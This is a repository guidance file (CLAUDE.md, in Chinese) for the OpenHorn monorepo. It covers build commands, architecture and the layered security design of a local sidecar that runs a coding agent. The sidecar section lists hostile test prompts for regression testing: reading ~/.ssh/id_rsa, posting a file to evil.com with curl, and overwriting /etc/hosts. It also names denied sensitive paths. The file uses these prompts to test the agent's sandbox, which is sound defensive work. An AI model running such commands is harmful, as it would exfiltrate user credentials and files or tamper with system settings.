# CLAUDE.md

本文件为 Claude Code (claude.ai/code) 在此仓库中工作时提供指引。

## 仓库结构

OpenHorn 是一个基于 Turborepo + pnpm workspace 的 monorepo。包管理器为 **pnpm**（见 `package.json` 中的 `packageManager` 字段），仓库中同时存在 `bun.lock` 是因为 server 和 sidecar 的**运行时**使用的是 Bun。

- `apps/web` — Next.js 15 / React 19 前端（端口 **3001**）
- `apps/server` — Bun + Hono API 服务器（端口 **3000**）
- `apps/desktop` — Tauri 2 + Vite + React 桌面端外壳（`src-tauri/` 是 Rust 宿主）
- `apps/sidecar` — 本地 Bun WebSocket 服务，由桌面端 **Tauri IPC** 拉起（`tauri.conf.json` 的 `bundle.externalBin`），在用户选定的工作目录里运行 Claude Agent SDK
- `packages/db` — Drizzle ORM schema（通过 `@libsql/client` 访问 SQLite），唯一定义在 `packages/db/src/schema/index.ts`
- `packages/shared` — 跨应用共享的 TypeScript 类型、常量与工具函数
- `packages/ui` — 共享的 React UI 组件（以 `ui` 名称导入）
- `packages/agent` — adapters/tools 的脚手架目录（基本为空；绝大部分 agent 逻辑位于 `apps/server/src/services/`）

## 常用命令

根目录（由 turbo 统一调度）：

```bash
pnpm install
pnpm dev              # turbo dev —— 并行启动所有应用
pnpm build            # turbo build
pnpm typecheck        # 对所有 workspace 做类型检查
pnpm check            # biome check .  （lint + 格式检查）
pnpm lint             # biome lint .
pnpm format           # biome format --write .
```

只启动单个应用：

```bash
pnpm dev:web          # next dev -p 3001
pnpm dev:server       # bun run --watch src/index.ts
pnpm dev:desktop      # tauri dev
pnpm --filter sidecar dev
```

Server 相关：

```bash
pnpm --filter server exec tsc --noEmit      # 类型检查
pnpm --filter server exec bun test          # 运行所有 server 测试
pnpm --filter server exec bun test src/services/agentService.ts   # 单个文件
pnpm --filter server exec bun test -t "should resolve runtime"     # 按用例名筛选
pnpm --filter server db:push                # drizzle-kit push（把 schema 应用到 sqlite）
pnpm --filter server db:studio              # drizzle studio
```

Sidecar 的测试同样用 `bun test`。桌面端测试也是基于 Bun 的（见 `apps/desktop/src/bun-test.d.ts`），同样通过 `bun test` 运行。**本仓库没有 Jest / Vitest —— 任何地方的测试都统一用 `bun test`**，即便是基于 Vite 构建的桌面端也不例外。

环境变量：执行 `cp .env.example .env`，至少需要设置 `DATABASE_URL`、`JWT_SECRET`、`ENCRYPTION_KEY`。Provider 密钥（`OPENAI_API_KEY`、`ANTHROPIC_API_KEY`、`DEEPSEEK_API_KEY`、`GOOGLE_API_KEY`）是可选的 —— channel 与密钥也可以通过 UI 按用户配置，并以加密形式存储在 SQLite 中。

## 架构

### 数据流

Agent 任务现在有**两条独立的执行路径**：

```
 ┌────────── 默认（远端）──────────┐
 desktop / web  ──HTTP/SSE──>  apps/server (Hono)  ──>  Drizzle/SQLite
                                        │
                                        ├─> provider 适配器 (openai / anthropic / google)
                                        └─> agent runtime (Claude Agent SDK 或 通用 tool-calling)

 ┌────────── sidecar（本机，仅桌面端）──────────┐
 desktop  ──Tauri IPC──>  Rust 宿主拉起 sidecar binary
          ──WebSocket──>  apps/sidecar (本机 127.0.0.1:随机端口)
                                        │
                                        └─> Claude Agent SDK（workspace 内 fs + sandbox-exec 中的 bash）
```

桌面端在 `Composer` 的 agent 模式下有一个 **"本地运行"** 开关：关时走上面那条 server 路径，开时走 sidecar 路径（凭据通过 server 的 `GET /channels/:id/credentials` 一次性取明文后交给 sidecar）。两条路径在消息层统一用 `message.runtimeKind: "server" | "sidecar"` 区分，`message.agentRun.taskId` 仅在 server 路径上有值。

桌面端渲染层对两条路径**复用同一套 `chatStore` + `DesktopAgentTaskCard` + `AgentRunPanel`**，sidecar 事件在 `lib/sidecarClient.ts` 里被投影成 `AgentTaskStreamEvent` 兼容形态。

### Server (apps/server)

入口：`apps/server/src/index.ts`。一个 Hono 应用挂载了多个路由模块：`/auth`、`/channels`、`/conversations`、`/messages`、`/attachments`、`/agent`、`/mcp`、`/settings`。启动时会调用 `bootstrapDatabase()`，执行 `apps/server/src/db/bootstrap.ts` 中的幂等 DDL —— 这才是**真正的运行时迁移机制**；`packages/db/src/schema/index.ts` 里的 Drizzle schema 是对应的**声明式镜像**，供 `drizzle-kit` 做类型推导以及可选的 `db:push`。新增字段或表时**必须同时更新这两处**。

关键服务模块（`apps/server/src/services/`）：

- `channelService.ts` —— 按用户维度的 provider channel CRUD，以及密钥加密。
- `channelAgentCheckService.ts` —— 对 channel 进行探测，决定其 **agent 能力模式**：`claude_sdk`（原生 Claude Agent SDK，要求是 Anthropic 兼容端点），或 `generic_tool_calling`（适用于任何实现了 `runToolCallingTurn` 的适配器）。核心函数是 `resolveAgentRuntime`。
- `agentService.ts` —— 聊天模式下 agent 运行的顶层编排器。负责选择 runtime、接线流式输出、将事件持久化到 `agent_events`、以及从 `agentStreamTimeouts.ts` 中应用超时策略。
- `agentSdk.ts` —— Claude Agent SDK 分支实现（`runClaudeAgentSdk`）。
- `genericAgentRuntime.ts` + `genericAgentTypes.ts` —— 在 SDK 分支不可用时走的通用 tool-calling 循环。包含工作区巡检启发式逻辑，并通过 `bashToolExecutor.ts` 执行 bash 工具。
- `agent-adapters.ts`（位于上一层 `src/` 目录）—— 定义 `ProviderAdapter` / `ToolCallingAdapter` 接口。`createAdapter()` 根据 channel 返回具体实现；实现了 `runToolCallingTurn` 的适配器就可以驱动通用 runtime。
- `agentTaskService.ts` + `agentPlanBuilder.ts` + `routes/agent.ts` —— Agent Workbench 所用的 **task / plan / run** 数据模型：一个 `agent_task` 关联到某次 `run`，其下挂着 `agent_plan_steps`（计划）、`agent_task_events`（事件流）、`agent_approval_requests`（审批）、`agent_artifacts`（产物）。
- `liveCapabilities.ts` + `liveRouteClassifier.ts` + `searchService.ts` —— 可选的实时搜索路由（Tavily）。`messageService.ts` 会结合分类器与用户设置，决定某轮聊天是否需要走 `web_search` 或 `research`。
- `mcpLoader.ts` + `mcpService.ts` + `routes/mcp.ts` —— 按用户维度的 MCP server 配置，在 agent 运行时加载。
- `attachmentService.ts` + `attachmentParser.ts` —— 附件上传（包括通过 `pdf-parse` 解析 PDF）。

### 数据库

单个 SQLite 文件位于 `data/openhorn.db`（可通过 `DATABASE_URL` 配置）。**每张表都定义了两份**：

1. **Drizzle schema**：`packages/db/src/schema/index.ts`，用于类型安全的查询以及 `drizzle-kit`。
2. **Bootstrap DDL**：`apps/server/src/db/bootstrap.ts`，这是**真正的运行时迁移路径** —— 每次 server 启动都会执行，全部使用 `CREATE TABLE IF NOT EXISTS`。

修改数据模型时两边都要改。仓库中目前没有在运行时使用传统的 migration 目录；`drizzle-kit push` 存在但**对全新部署而言，bootstrap DDL 才是权威**。

主要表：`users`、`channels` + `channel_models`、`conversations`、`messages`、`agent_sessions` + `agent_events`（聊天模式下的 agent 运行）、`agent_tasks` + `agent_runs` + `agent_plan_steps` + `agent_task_events` + `agent_approval_requests` + `agent_artifacts`（Agent Workbench）、`mcp_servers`、`attachments`、`settings`。

### Web 应用 (apps/web)

使用 Next.js 15 App Router，页面位于 `src/app`。状态管理用 **Zustand**（`src/stores/` 下的 `authStore`、`chatStore`、`uiStore`、`backendStatusStore`）；数据请求用 `@tanstack/react-query`；UI 是 Tailwind 3 + Radix + 共享 `ui` 包；Markdown 渲染使用 `react-markdown` 搭配 `remark-gfm`、`remark-breaks`，以及 `react-syntax-highlighter`。

### 桌面应用 (apps/desktop)

Tauri 2 外壳包着 Vite + React 渲染层。渲染层在视觉上与 web 聊天界面相似，但**是刻意独立的一棵组件树**（`apps/desktop/src/components/chat/Desktop*.tsx`）—— **不要假设它与 `apps/web` 保持对齐**；桌面端专属的流式 / 平滑输出逻辑位于 `src/lib/textStreamSmoother.ts` 与 `src/lib/agentOutput.ts`。状态管理同样是 Zustand（`src/stores/chatStore.ts`、`src/stores/sidecarStore.ts` 等）。Rust 宿主代码在 `src-tauri/`。

桌面端的 chat store 在处理 agent 运行结果时，**会优先采用实时执行流，而不是基于轮询的回退路径**。改动流式相关代码时请保持这一优先顺序。

**文案与数据真实性原则（Phase 0 锁定）**：桌面端面向用户的中英文混合是有严格规则的——

- **Process 行 / 状态机字面量 / 工具名** 一律保留英文（`Bash` / `Search` / `MCP` / `Skill` / `Approved` / `Rejected` / `Awaiting confirmation` …）。这些是"非用户面"的 process 流元素，翻译反而有害。
- **用户面中文文案**（状态徽标、按钮 label、空状态、错误提示）**只允许**通过 `apps/desktop/src/lib/i18n/agent.ts` 里的字典取值。这是**唯一允许出现中文用户文案的源头**。禁止在组件里内联中文字符串；当字典查不到时返回 `null`，调用方必须显式降级（通常是不渲染这一行），**禁止用 fallback 字符串**。
- **server 绝不编造 message.content**：`agentTaskService.insight.previewText` 只来自真实的 run summary / final_result / error。`messageService.buildTaskMessageSummary` 在无真数据时返回空字符串——桌面端据此判断"是否有真内容"，而不是拿硬编码字符串做 equality 比较。
- **错误展示走结构化 errorCode**，不做字符串匹配翻译。server 在 agent task event 的 metadata 里发 `errorCode` / `runtimeIssue`，桌面端 `normalizeAgentDisplayText` + `getAgentErrorLabel` 查字典渲染；上游原始英文错误**原样保留**。

**Agent 任务卡的交互面板（Phase A）**：

- `DesktopAgentTaskCard.tsx` 是 task-backed agent 消息的主渲染器。
- `DesktopAgentPlanPanel.tsx` 渲染 `detail.planSteps`，在存在 `plan_approval` pending 时内联 `通过 / 拒绝` 按钮。**plan_approval 通过后任务会回到 `draft`**——桌面端在 `handleApprovalResponse` 的 `onPlanApprovalAccepted` 回调里**自动 execute 下一轮**，用户不需要再点"开始执行"。
- `DesktopAgentToolApprovalPanel.tsx` 渲染 `tool_approval` 的真实 payload（toolName、toolInput 摘要、decisionReason、blockedPath + 可折叠 JSON 原文），提供 `允许 / 拒绝` 按钮。
- **不存在独立的 "重试 / 继续" 按钮**——消息气泡下方已有的 `复制 / 重新生成 / 删除` 图标行已经覆盖这些能力，不要重复。`runExecutionAction("retry" | "continue")` 内部函数保留，供 `handleApprovalResponse` 等路径复用，但 UI 不暴露。
- **Composer 的 `Stop` 按钮联动 task cancel**：当前 streaming message 是 task-backed agent 时，`handleStop` 会先调 `api.agentTasks.cancel(taskId)` 再 abort 本地 SSE——否则 task 会在 server 上孤儿跑下去。

**Sidecar runtime 接线（Phase C）**：

- `lib/tauriBridge.ts` 动态 `import("@tauri-apps/api/core")` 并检查 `window.__TAURI_INTERNALS__`。在纯 Vite dev 模式下它返回 `null`，`sidecarStore.attachPlatform(null)` 把 store park 在 `unsupported` 状态。
- `lib/sidecarClient.ts` 是一个小型的 WebSocket + JSON-RPC 客户端，把 sidecar 的 `agent.event` 投影成桌面端已有的 `AgentTaskStreamEvent` 形态，这样 `chatStore.applyStreamEvent` 与 `DesktopAgentTaskCard` 可以原样复用。
- `stores/sidecarStore.ts` 的状态机：`idle → starting → connecting → ready → (unsupported | error)`。`attachPlatform` 是 App bootstrap 与 store 的唯一接缝，避免了 `getTauriSidecarPlatform` 的 async import 需要 await 到模块顶层。
- `hooks/useSidecarAgentRun.ts` 把 sidecar 运行与 chatStore 消息管道粘在一起：拉凭据 → `runAgent` → 把事件回推到对应的 assistant message。当前只接受 Anthropic 协议的 channel（sidecar 驱动的是 Claude Agent SDK）；其它 protocol 在 hook 里会直接 reject。
- `components/chat/DesktopSidecarRuntimePanel.tsx` 是 composer 上方的浮动面板，**只有在 sidecar 有"事"时才渲染**：pending tool approval、运行中要显示 `停止`、或最近一次 run 的 `回滚此次执行`。注意 rollback 的 caveat 必须展示给用户：**checkpoint 不覆盖 bash 改动**，只能回滚 SDK Write/Edit 过的文件。
- `components/chat/DesktopSidecarWorkspaceBadge.tsx` 在 chat header 右上角；`unsupported` 时**完全不渲染**（与 Composer 的"本地运行"开关策略一致——两处都要按这个规则走，不要只隐藏一个）。
- 凭据路径：`GET /channels/:id/credentials` 是**唯一**返回明文 apiKey 的 server 端点，有 `requireUser` 中间件 + `getResolvedChannelById(userId, channelId)` 二次用户级校验 + 审计日志。

### Sidecar (apps/sidecar)

一个独立的 Bun WebSocket 服务，由 Tauri 宿主在本地拉起（见 `apps/desktop/src-tauri/src/lib.rs` 的 `start_sidecar` IPC 与 `tauri.conf.json` 的 `bundle.externalBin`）。对外暴露一个类 JSON-RPC 的协议（`protocol.ts`），提供方法用于文件系统操作（`fs.ts`）、检查点（`checkpoints.ts`）、shell 风险评估（`shell-risk.ts`），以及运行 Claude Agent SDK（`agent/claude.ts`）。

**Sidecar 的安全姿态是分层防御的**。改动任何一层之前先理解全部：

1. **本地端口 + Origin 隔离**：`index.ts` 强制 `OPENHORN_HOST` 必须是 loopback（`127.0.0.1` / `::1` / `localhost`），非 loopback 会在启动时 `process.exit(1)`。WebSocket upgrade 时检查 `Origin`，只接受 `tauri://localhost`、`http://localhost:5173`、`http://127.0.0.1:5173` 或无 Origin header。单连接上限 `MAX_CONCURRENT_CONNECTIONS = 1`，超限返回 429。5 分钟 idle reaper 清理闲置连接。
2. **Handshake token**：Tauri 宿主每次 spawn 时通过 `OPENHORN_HANDSHAKE_TOKEN` 环境变量注入一个 32 字节 OsRng 随机值，所有 RPC 前必须 `auth.handshake`。
3. **Workspace 边界**：`workspace.ts` 暴露 `canonicalizeWorkspaceRoot`（realpath + 拒绝 `/`、`/etc`、`/usr`、家目录、`~/.ssh`、`Library/Keychains` 等敏感根）、`resolvePathInsideWorkspace`（lexical，拒绝绝对路径与 `..` traversal）、`resolveWritePathInsideWorkspace`（写操作专用：realpath 目标或最深祖先，防 symlink 跳出）。`fs.ts` 的 `fsWriteText` **必须**用后者，不能用前者。
4. **SDK fs 工具走同一套 workspace 校验**：`agent/claude.ts` 的 `canUseTool` 对 Read/Write/Edit 调用 `checkSdkFsToolPath`，Read 走 lexical 检查、Write/Edit 走 realpath-of-ancestor 检查。SDK 内置的 cwd-based 检查不能代替这一层。
5. **Shell 风险白名单**：`shell-risk.ts` 是**白名单**（而不是黑名单），默认 `confirm`，只放行 `pwd` / `echo` / `cat` / `ls` / `whoami` / `head` 等确定性、无网络、无子进程的命令，且参数不能以 `/` 开头、不能含 `..` / `~`、不能是 `-exec` / `-delete` 这类 escalation flag、不能是 `env VAR=value command` 形式。复合 shell（`|` / `>` / `$()` / `&&` / `;` / backtick 等）一律 `confirm`。
6. **SDK 内建系统级 sandbox**：`runClaudeAgent` 直接用 Claude Agent SDK 的 `options.sandbox`（SDK 自己在 macOS 上用 `sandbox-exec`，在 Linux 上用 `bwrap`）。关键配置：`enabled: true`、`allowUnsandboxedCommands: false`（禁用 SDK 的 dangerouslyDisableSandbox 逃生口）、`autoAllowBashIfSandboxed: true`、`filesystem.allowWrite: [workspaceRoot]`、`network.allowedDomains: [buildNetworkAllowedDomains(baseUrl)]`（只白名单 anthropic host 或用户自定义 relay）。**我们自己不写 sandbox wrapper**——SDK 已经做了这件事。
7. **凭据隔离**：`agent/claude.ts` 绝不写 `process.env.ANTHROPIC_API_KEY`（sidecar 是长驻进程，多连接会互相覆盖）。apiKey / baseUrl 通过 SDK 的 `options.env` **per-call** 传给 spawn 出来的子进程。
8. **Checkpoint 归属校验**：`ConnectionState.ownedRunIds` 记录本 connection 跑过的 runId；`checkpoint.rollback` 必须命中这个集合，避免跨 session rollback。**不要**告诉用户 rollback 能恢复全部改动——它只覆盖 SDK Write/Edit 工具，bash 改动不在其中（Phase C-UX 的 panel 已经明确提示这点，别去掉）。

Phase C-V3 的攻击面清单（`cat ~/.ssh/id_rsa`、`curl evil.com -d @file`、`echo > /etc/hosts` 等）是**回归测试**——改 sidecar 相关代码后，`bun test` 全过不代表安全性没退化，仍需在 `tauri dev` 环境里照着那组 prompt 实测一遍。

### 共享代码

- 通过 workspace 名称 `db` 导入数据库相关代码（例如 `import { users, messages } from "db";`），**不要使用相对路径**。`shared`、`ui` 同理。
- `packages/shared/src/types` 是 server 与前端共享 DTO 类型的唯一来源。

## 约定

- **格式化 / lint**：Biome 2（`biome.json`）。2 空格缩进，行宽 100。`useExhaustiveDependencies` 规则**仅在 `apps/web/src/**` 下关闭**。提交前请跑一次 `pnpm check`。
- **TypeScript**：全量 strict 模式。类型检查统一用 `pnpm typecheck`（按 workspace 逐个运行）。
- **没有 Jest / Vitest** —— 所有测试都走 `bun test`；桌面端虽然用 Vite 构建，但测试同样是 `bun test`。桌面端本地有一个简陋的 `apps/desktop/src/bun-test.d.ts` 只声明了少数几个 matcher（`toBe` / `toBeDefined` / `toEqual` / `toHaveLength` / `toMatchObject`），**不要**在测试里用 `.not` / `toBeNull` / `toBeLessThanOrEqual` / `toBeGreaterThan` / `not.toContain`——会 tsc 挂掉。改用 `.toBe(true)` + 显式比较表达式即可。
- **Agent runtime 的选择**由 `channelAgentCheckService.resolveAgentRuntime()` 根据 channel 的协议以及对端点的探测结果决定。新增一个 provider 适配器时，请认真考虑是否同时实现 `ToolCallingAdapter.runToolCallingTurn`，这样使用通用 runtime 的用户也能用上 agent 模式。
- **务必保持 `bootstrap.ts` 的 DDL 与 `packages/db/src/schema/index.ts` 同步** —— 它们是同一份 schema 契约的两半。
- **不要硬编码显示给用户的文案**。中文用户面文案走 `apps/desktop/src/lib/i18n/agent.ts`；错误用结构化 `errorCode` / `runtimeIssue` 查字典；真数据原样显示。如果字典里查不到就**不渲染**，不要用 fallback 字符串。Phase 0 专门清理过一遍假文案，不要回退。
- **Git commit 习惯：精确 stage**。仓库长期有一批会话间的未提交改动（`apps/desktop/src/lib/textStreamSmoother.ts`、`apps/desktop/src/stores/chatStore.ts` 等老工作区文件），**不要**用 `git add .` / `git add -A`。每次 commit 按文件名 `git add <path> <path>...`，避免把跟本次任务无关的修改拖进去。根目录偶尔会出现 smoke test 截图（`smoke-*.png` / `phaseC-*.png` 等），commit 前记得删。
- **Tauri sidecar 的生命周期**：改 `apps/sidecar/src/` 后要 `pnpm --filter sidecar run compile:tauri:host` 重新生成 `apps/desktop/src-tauri/binaries/openhorn-sidecar-<triple>`，否则 `cargo check` 会因为 `externalBin` 指向的文件不存在而失败。该目录在 `.gitignore` 里，不进仓库。
- **基线测试噪音**：server 端有约 15 个**预存在**的 `db.delete is not a function` / `Export named 'getChannels' not found` 类型失败（`pnpm --filter server exec bun test`），与历次改动无关，改服务端代码后核对失败数字是否变化，而不是总数。
